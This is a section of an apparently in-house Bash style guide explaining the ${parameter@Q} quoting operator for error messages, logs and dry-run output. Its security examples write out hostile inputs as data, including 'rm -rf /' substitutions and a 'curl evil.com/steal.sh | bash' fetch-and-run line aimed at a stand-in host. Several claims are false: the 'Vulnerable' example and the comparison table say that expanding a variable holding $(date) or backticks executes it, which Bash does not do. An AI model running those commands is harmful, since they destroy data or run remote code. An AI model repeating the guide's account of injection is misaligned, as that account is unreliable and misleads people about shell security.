## Parameter Quoting with `${parameter@Q}`

**Use the `${parameter@Q}` operator to safely quote parameter values in error messages, logging, and debugging output.**

**Rationale:**
- Prevents command injection - safely displays user input with shell metacharacters
- Produces shell-quoted strings that can be copy-pasted back into shell
- Shows exact parameter values including whitespace and special characters without expansion

### The `@Q` Operator

**Syntax:** `${parameter@Q}`

**Function:** Expands parameter value quoted in a format re-usable as shell input.

```bash
name='hello world'
echo "${name@Q}"      # Output: 'hello world'

name="foo's bar"
echo "${name@Q}"      # Output: 'foo'\''s bar'

name='$(rm -rf /)'
echo "${name@Q}"      # Output: '$(rm -rf /)'
```

### Primary Use Cases

**1. Error Messages**

Most common use - safely display user-provided arguments:

```bash
# Without @Q - Injection risk
die 2 "Unknown option $1"
# Input: --option='`rm -rf /`'
# Output: Unknown option `rm -rf /`  (EXPANDS! Security risk!)

# With @Q - Safe
die 2 "Unknown option ${1@Q}"
# Input: --option='`rm -rf /`'
# Output: Unknown option '`rm -rf /`'  (Literal, safe)
```

**Argument validation:**
```bash
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"
  fi
}

arg2_num() {
  if ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]]; then
    die 2 "${1@Q} requires a numeric argument"
  fi
}
```

**2. Logging and Debug Output**

```bash
debug() {
  ((DEBUG)) || return 0
  local -- msg="$1"
  shift
  local -- arg
  for arg in "$@"; do
    msg+=" ${arg@Q}"
  done
  >&2 echo "[DEBUG] $msg"
}

# Usage:
debug "Processing files:" "$file1" "$file2"
# Output: [DEBUG] Processing files: 'foo bar.txt' 'test  file.txt'
```

**3. Displaying User Input**

```bash
info "You entered ${filename@Q}"
# Input: filename='file with spaces & specials'
# Output: You entered 'file with spaces & specials'

warn "Skipping invalid entry ${entry@Q}"
# Input: entry='$HOME/test'
# Output: Skipping invalid entry '$HOME/test'  (not expanded)
```

**4. Verbose/Dry-Run Mode**

```bash
run_command() {
  local -a cmd=("$@")

  if ((DRY_RUN)); then
    local -- quoted_cmd
    printf -v quoted_cmd '%s ' "${cmd[@]@Q}"
    info "[DRY-RUN] Would execute: $quoted_cmd"
    return 0
  fi

  "${cmd[@]}"
}

# Usage:
run_command rm -f "/tmp/file with spaces.txt"
# Output: [DRY-RUN] Would execute: rm -f '/tmp/file with spaces.txt'
```

### Comparison Table

| Input Value | `$var` | `"$var"` | `${var@Q}` |
|-------------|--------|----------|------------|
| `hello world` | `hello` `world` (splits) | `hello world` | `'hello world'` |
| `foo's bar` | `foos` `bar` (error) | `foo's bar` | `'foo'\''s bar'` |
| `$(date)` | *executes* | *executes* | `'$(date)'` (literal) |
| `*.txt` | *glob expands* | `*.txt` | `'*.txt'` |
| `$HOME/test` | */home/user/test* | */home/user/test* | `'$HOME/test'` (literal) |
| Empty string | *(nothing)* | `` | `''` |

### When to Use `${var@Q}`

** Use for:**
- Error messages with user input: `die 2 "Invalid option ${opt@Q}"`
- Logging user-provided values: `info "Processing ${filename@Q}"`
- Debug output: `debug "vars:" "${arr[@]@Q}"`
- Dry-run command display: `info "[DRY-RUN] ${cmd@Q}"`
- Showing validation failures: `warn "Rejecting ${input@Q}"`

** Don't use for:**
- Normal variable expansion: `process "$filename"` (not `process "${filename@Q}"`)
- Data output to stdout: `echo "$result"` (not `echo "${result@Q}"`)
- Assignments: `target="$source"` (not `target="${source@Q}"`)
- Comparisons: `[[ "$var" == "$value" ]]` (not with @Q)

### Security Example

```bash
# Vulnerable (NO @Q)
validate_input() {
  [[ -z "$1" ]] && die 2 "Option $2 requires argument"
  # Input: --name='`curl evil.com/steal.sh | bash`'
  # Executes command in error message!
}

# Safe (WITH @Q)
validate_input() {
  [[ -z "$1" ]] && die 2 "Option ${2@Q} requires argument"
  # Input: --name='`curl evil.com/steal.sh | bash`'
  # Shows literally: Option '`curl evil.com/steal.sh | bash`' requires argument
}
```

### Other `@` Operators (reference)

| Operator | Purpose | Example |
|----------|---------|---------|
| `${var@Q}` | Quote for shell reuse | `'hello world'` |
| `${var@E}` | Expand escape sequences | `$'hello\nworld'` |
| `${var@P}` | Prompt expansion | *(PS1-style)* |
| `${var@A}` | Assignment form | `var='value'` |
| `${var@a}` | Attributes | `i` |
| `${var@U}` | Uppercase | `HELLO` |
| `${var@L}` | Lowercase | `hello` |

**For BCS, `@Q` is most commonly used** for safe parameter display.

### Anti-Patterns

```bash
#  Wrong - No quoting, injection risk
die 2 "Unknown option $1"

#  Wrong - Double quotes don't prevent expansion
die 2 "Unknown option \"$1\""

#  Wrong - Manual escaping fragile
die 2 "Unknown option '$(sed "s/'/'\\\\''/g" <<<"$1")'"

#  Correct
die 2 "Unknown option ${1@Q}"
```

### Summary

**The `${parameter@Q}` operator is critical for:**
1. Security - prevents command injection in error messages
2. Clarity - shows exact values including whitespace
3. Debugging - produces re-usable shell input
4. Consistency - standard way to quote user input

**Standard pattern:** Display user input in error messages, warnings, or logs with `${parameter@Q}`.

**See also:** BCS1003 (Argument Validation), BCS0903 (Message Functions), BCS0406 (Variables in Conditionals)
